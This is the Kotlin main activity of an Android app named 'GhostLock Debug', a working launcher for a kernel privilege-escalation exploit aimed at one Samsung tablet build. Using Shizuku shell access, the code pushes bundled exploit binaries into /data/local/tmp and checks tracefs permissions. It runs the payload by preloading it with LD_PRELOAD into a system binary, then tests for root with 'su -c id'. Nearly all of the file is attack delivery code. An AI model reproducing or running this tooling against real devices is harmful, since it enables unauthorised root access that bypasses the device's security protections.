package com.ghostlock.debug

import android.content.Intent
import android.content.pm.PackageManager
import android.os.Build
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.os.ParcelFileDescriptor
import android.text.SpannableStringBuilder
import android.text.Spanned
import android.text.style.ForegroundColorSpan
import android.widget.ScrollView
import android.widget.TextView
import androidx.appcompat.app.AppCompatActivity
import com.google.android.material.button.MaterialButton
import moe.shizuku.server.IRemoteProcess
import moe.shizuku.server.IShizukuService
import rikka.shizuku.Shizuku
import java.io.BufferedReader
import java.io.BufferedWriter
import java.io.File
import java.io.FileOutputStream
import java.io.FileWriter
import java.io.InputStreamReader
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale

class MainActivity : AppCompatActivity() {

    private lateinit var logView: TextView
    private lateinit var scrollView: ScrollView
    private lateinit var deviceInfo: TextView
    private lateinit var shizukuStatus: TextView
    private lateinit var btnPselect: MaterialButton
    private lateinit var btnFpsimd: MaterialButton
    private lateinit var btnTcp: MaterialButton
    private lateinit var btnClear: MaterialButton
    private lateinit var btnShare: MaterialButton

    private val handler = Handler(Looper.getMainLooper())
    private val logBuffer = SpannableStringBuilder()
    private var shizukuReady = false
    private var running = false

    private var logFileWriter: BufferedWriter? = null
    private var logFilePath: String? = null

    private val SHIZUKU_PERM_CODE = 1001
    private val PAYLOAD_DIR = "/data/local/tmp"
    private val ROOT_HELPER = "cve-2026-43499-root"

    private fun shizukuService(): IShizukuService =
        IShizukuService.Stub.asInterface(Shizuku.getBinder())

    private fun shellExec(cmd: String): IRemoteProcess =
        shizukuService().newProcess(arrayOf("sh", "-c", cmd), null, null)

    private fun shellExecEnv(args: Array<String>, env: Array<String>?): IRemoteProcess =
        shizukuService().newProcess(args, env, null)

    private val binderReceivedListener = Shizuku.OnBinderReceivedListener {
        log("Shizuku binder received", COL_GREEN)
        checkShizukuPermission()
    }

    private val binderDeadListener = Shizuku.OnBinderDeadListener {
        log("Shizuku binder dead", COL_RED)
        shizukuReady = false
        updateUI()
    }

    private val permResultListener =
        Shizuku.OnRequestPermissionResultListener { requestCode, grantResult ->
            if (requestCode == SHIZUKU_PERM_CODE) {
                if (grantResult == PackageManager.PERMISSION_GRANTED) {
                    log("Shizuku permission granted", COL_GREEN)
                    shizukuReady = true
                    updateUI()
                    extractAssets()
                } else {
                    log("Shizuku permission DENIED", COL_RED)
                }
            }
        }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        logView = findViewById(R.id.log_view)
        scrollView = findViewById(R.id.scroll_view)
        deviceInfo = findViewById(R.id.device_info)
        shizukuStatus = findViewById(R.id.shizuku_status)
        btnPselect = findViewById(R.id.btn_pselect)
        btnFpsimd = findViewById(R.id.btn_fpsimd)
        btnTcp = findViewById(R.id.btn_tcp)
        btnClear = findViewById(R.id.btn_clear)
        btnShare = findViewById(R.id.btn_share)

        showDeviceInfo()
        openLogFile()

        btnPselect.setOnClickListener { runExploit("pselect", "cve-2026-43499-pselect") }
        btnFpsimd.setOnClickListener { runExploit("fpsimd", "cve-2026-43499-fpsimd") }
        btnTcp.setOnClickListener { runExploit("tcp", "cve-2026-43499-tcp") }
        btnClear.setOnClickListener { clearLog() }
        btnShare.setOnClickListener { shareLog() }

        Shizuku.addBinderReceivedListenerSticky(binderReceivedListener)
        Shizuku.addBinderDeadListener(binderDeadListener)
        Shizuku.addRequestPermissionResultListener(permResultListener)

        log("GhostLock Debug v${BuildConfig.VERSION_NAME}", COL_CYAN)
        log("Target: SM-X900 (gts8x-X900XXSBEZE1)", COL_CYAN)
        log("Kernel: 5.10.236 / LEGACY waiter 0x50 / 32KB KASLR", COL_CYAN)
        log("Log file: ${logFilePath ?: "none"}", COL_DIM)
        log("---", COL_DIM)
        log("Waiting for Shizuku...", COL_YELLOW)
    }

    override fun onDestroy() {
        super.onDestroy()
        closeLogFile()
        Shizuku.removeBinderReceivedListener(binderReceivedListener)
        Shizuku.removeBinderDeadListener(binderDeadListener)
        Shizuku.removeRequestPermissionResultListener(permResultListener)
    }

    private fun openLogFile() {
        try {
            val extDir = getExternalFilesDir(null)
            if (extDir != null) {
                extDir.mkdirs()
                val ts = SimpleDateFormat("yyyyMMdd_HHmmss", Locale.US).format(Date())
                val file = File(extDir, "ghostlock-debug-$ts.log")
                logFileWriter = BufferedWriter(FileWriter(file, true))
                logFilePath = file.absolutePath
                return
            }
        } catch (_: Exception) {}
        try {
            val file = File(filesDir, "ghostlock-debug.log")
            logFileWriter = BufferedWriter(FileWriter(file, true))
            logFilePath = file.absolutePath
        } catch (_: Exception) {}
    }

    private fun closeLogFile() {
        try {
            logFileWriter?.flush()
            logFileWriter?.close()
        } catch (_: Exception) {}
        logFileWriter = null
    }

    private fun writeToLogFile(text: String) {
        try {
            val ts = SimpleDateFormat("HH:mm:ss.SSS", Locale.US).format(Date())
            logFileWriter?.write("[$ts] $text\n")
            logFileWriter?.flush()
        } catch (_: Exception) {}
    }

    private fun showDeviceInfo() {
        val info = buildString {
            append("${Build.MANUFACTURER} ${Build.MODEL} (${Build.DEVICE})\n")
            append("Android ${Build.VERSION.RELEASE} / SDK ${Build.VERSION.SDK_INT}\n")
            append("ABI: ${Build.SUPPORTED_ABIS.joinToString()}\n")
            append("Build: ${Build.DISPLAY}")
        }
        deviceInfo.text = info
    }

    private fun checkShizukuPermission() {
        try {
            if (Shizuku.isPreV11()) {
                log("Shizuku pre-v11 not supported", COL_RED)
                return
            }
            if (Shizuku.checkSelfPermission() == PackageManager.PERMISSION_GRANTED) {
                log("Shizuku permission OK", COL_GREEN)
                shizukuReady = true
                updateUI()
                extractAssets()
            } else if (Shizuku.shouldShowRequestPermissionRationale()) {
                log("Shizuku permission denied permanently", COL_RED)
            } else {
                log("Requesting Shizuku permission...", COL_YELLOW)
                Shizuku.requestPermission(SHIZUKU_PERM_CODE)
            }
        } catch (e: Exception) {
            log("Shizuku check failed: ${e.message}", COL_RED)
        }
    }

    private fun updateUI() {
        handler.post {
            val ready = shizukuReady && !running
            btnPselect.isEnabled = ready
            btnFpsimd.isEnabled = ready
            btnTcp.isEnabled = ready
            shizukuStatus.text = when {
                running -> "Shizuku: RUNNING exploit..."
                shizukuReady -> "Shizuku: ready (shell UID)"
                else -> "Shizuku: not connected"
            }
            shizukuStatus.setTextColor(
                when {
                    running -> 0xFFFFAA00.toInt()
                    shizukuReady -> 0xFF44BB44.toInt()
                    else -> 0xFFFF6B6B.toInt()
                }
            )
        }
    }

    private fun extractAssets() {
        Thread {
            log("--- Asset extraction ---", COL_DIM)
            val files = arrayOf(
                "cve-2026-43499-pselect",
                "cve-2026-43499-fpsimd",
                "cve-2026-43499-tcp",
                ROOT_HELPER
            )
            for (name in files) {
                try {
                    val data = assets.open("arm64/$name").use { it.readBytes() }
                    log("Pushing $name (${data.size} bytes)...", COL_YELLOW)
                    val dst = "$PAYLOAD_DIR/$name"
                    val cmd = "cat > $dst && chmod 755 $dst"
                    val proc = shellExec(cmd)
                    val pfd = proc.outputStream
                    FileOutputStream(pfd.fileDescriptor).use { fos ->
                        fos.write(data)
                        fos.flush()
                    }
                    pfd.close()
                    val exit = proc.waitFor()
                    if (exit == 0) {
                        log("  OK: $dst", COL_GREEN)
                    } else {
                        val errPfd = proc.errorStream
                        val err = ParcelFileDescriptor.AutoCloseInputStream(errPfd)
                            .bufferedReader().readText()
                        log("  FAIL (exit=$exit): $err", COL_RED)
                    }
                } catch (e: Exception) {
                    log("  ERROR pushing $name: ${e.message}", COL_RED)
                }
            }
            verifyFiles()
        }.start()
    }

    private fun verifyFiles() {
        log("--- Verification ---", COL_DIM)
        try {
            val cmd = buildString {
                append("echo '== Files =='; ls -la $PAYLOAD_DIR/cve-2026-43499-*; ")
                append("echo '== SELinux context =='; ls -laZ $PAYLOAD_DIR/cve-2026-43499-*; ")
                append("echo '== id =='; id; ")
                append("echo '== getenforce =='; getenforce; ")
                append("echo '== uname =='; uname -a; ")
                append("echo '== /proc/version =='; cat /proc/version")
            }
            val proc = shellExec(cmd)
            val reader = BufferedReader(
                InputStreamReader(ParcelFileDescriptor.AutoCloseInputStream(proc.inputStream))
            )
            var line: String?
            while (reader.readLine().also { line = it } != null) {
                val col = if (line!!.startsWith("==")) COL_CYAN else COL_WHITE
                log(line!!, col)
            }
            val exit = proc.waitFor()
            log("Verify exit=$exit", if (exit == 0) COL_GREEN else COL_RED)
            log("---", COL_DIM)
            log("Ready. Pick a route to run.", COL_GREEN)
        } catch (e: Exception) {
            log("Verify error: ${e.message}", COL_RED)
        }
    }

    private fun runExploit(routeName: String, payloadFile: String) {
        if (running || !shizukuReady) return
        running = true
        updateUI()

        Thread {
            val payload = "$PAYLOAD_DIR/$payloadFile"
            val rootHelper = "$PAYLOAD_DIR/$ROOT_HELPER"

            log("========================================", COL_CYAN)
            log("  ROUTE: $routeName", COL_CYAN)
            log("  Payload: $payloadFile", COL_CYAN)
            log("========================================", COL_CYAN)

            try {
                log("Checking payload exists...", COL_YELLOW)
                val checkProc = shellExec("ls -la $payload && file $payload")
                readProcessOutput(checkProc)

                log("Checking tracefs access...", COL_YELLOW)
                val traceCmd = buildString {
                    append("echo '-- tracefs mount --'; mount | grep tracefs; ")
                    append("echo '-- trace_pipe readable --'; ")
                    append("timeout 1 cat /sys/kernel/tracing/trace_pipe 2>&1 | head -1 || echo 'no access'; ")
                    append("echo '-- trace_marker writable --'; ")
                    append("echo test > /sys/kernel/tracing/trace_marker 2>&1 && echo 'yes' || echo 'no'")
                }
                val traceProc = shellExec(traceCmd)
                readProcessOutput(traceProc, COL_DIM)

                log("---", COL_DIM)
                log("Launching exploit via LD_PRELOAD...", COL_YELLOW)
                log("  CVE43499_ROOT_HELPER=$rootHelper", COL_DIM)
                log("  LD_PRELOAD=$payload", COL_DIM)

                val exploitCmd = buildString {
                    append("export CVE43499_ROOT_HELPER=$rootHelper; ")
                    append("export LD_PRELOAD=$payload; ")
                    append("exec /system/bin/ls 2>&1")
                }
                val proc = shellExec(exploitCmd)

                val stdoutThread = Thread {
                    try {
                        val reader = BufferedReader(InputStreamReader(
                            ParcelFileDescriptor.AutoCloseInputStream(proc.inputStream)
                        ))
                        var line: String?
                        while (reader.readLine().also { line = it } != null) {
                            log(line!!, classifyLine(line!!))
                        }
                    } catch (_: Exception) {}
                }

                val stderrThread = Thread {
                    try {
                        val reader = BufferedReader(InputStreamReader(
                            ParcelFileDescriptor.AutoCloseInputStream(proc.errorStream)
                        ))
                        var line: String?
                        while (reader.readLine().also { line = it } != null) {
                            log(line!!, classifyLine(line!!))
                        }
                    } catch (_: Exception) {}
                }

                stdoutThread.start()
                stderrThread.start()
                stdoutThread.join(120_000)
                stderrThread.join(5_000)

                val exit = proc.waitFor()
                log("---", COL_DIM)
                log("Process exited with code $exit", if (exit == 0) COL_GREEN else COL_RED)

                if (exit == 0) {
                    log("Checking if root was obtained...", COL_YELLOW)
                    val rootCheck = shellExec("su -c id 2>&1 || echo 'su not available'")
                    readProcessOutput(rootCheck, COL_CYAN)
                }

            } catch (e: Exception) {
                log("EXCEPTION: ${e.javaClass.simpleName}: ${e.message}", COL_RED)
                e.stackTrace.take(5).forEach { log("  $it", COL_RED) }
            } finally {
                running = false
                updateUI()
                log("========================================", COL_DIM)
            }
        }.start()
    }

    private fun readProcessOutput(proc: IRemoteProcess, defaultColor: Int = COL_WHITE) {
        val reader = BufferedReader(
            InputStreamReader(ParcelFileDescriptor.AutoCloseInputStream(proc.inputStream))
        )
        var line: String?
        while (reader.readLine().also { line = it } != null) {
            log(line!!, if (defaultColor != COL_WHITE) defaultColor else classifyLine(line!!))
        }
        proc.waitFor()
    }

    private fun classifyLine(line: String): Int {
        return when {
            line.contains("[!]") || line.contains("ERROR") || line.contains("FAIL") ||
            line.contains("panic") || line.contains("fatal") -> COL_RED
            line.contains("[+]") || line.contains("SUCCESS") || line.contains("root") -> COL_GREEN
            line.contains("[*]") || line.contains("INFO") -> COL_CYAN
            line.contains("[~]") || line.contains("WARN") || line.contains("retry") -> COL_YELLOW
            line.contains("[#]") || line.contains("DBG") || line.contains("debug") -> COL_DIM
            line.startsWith("---") || line.startsWith("===") -> COL_DIM
            else -> COL_WHITE
        }
    }

    private fun log(text: String, color: Int = COL_WHITE) {
        writeToLogFile(text)
        handler.post {
            val start = logBuffer.length
            logBuffer.append(text)
            logBuffer.append("\n")
            logBuffer.setSpan(
                ForegroundColorSpan(color),
                start, start + text.length,
                Spanned.SPAN_EXCLUSIVE_EXCLUSIVE
            )
            logView.text = logBuffer
            scrollView.post { scrollView.fullScroll(ScrollView.FOCUS_DOWN) }
        }
    }

    private fun clearLog() {
        logBuffer.clear()
        logView.text = ""
    }

    private fun shareLog() {
        val text = logBuffer.toString()
        if (text.isBlank()) return
        val intent = Intent(Intent.ACTION_SEND).apply {
            type = "text/plain"
            putExtra(Intent.EXTRA_SUBJECT, "GhostLock Debug Log")
            putExtra(Intent.EXTRA_TEXT, text)
        }
        startActivity(Intent.createChooser(intent, "Share log"))
    }

    companion object {
        const val COL_RED = 0xFFFF6B6B.toInt()
        const val COL_GREEN = 0xFF44BB44.toInt()
        const val COL_YELLOW = 0xFFFFAA00.toInt()
        const val COL_CYAN = 0xFF44CCCC.toInt()
        const val COL_WHITE = 0xFFCCCCCC.toInt()
        const val COL_DIM = 0xFF888888.toInt()
    }
}
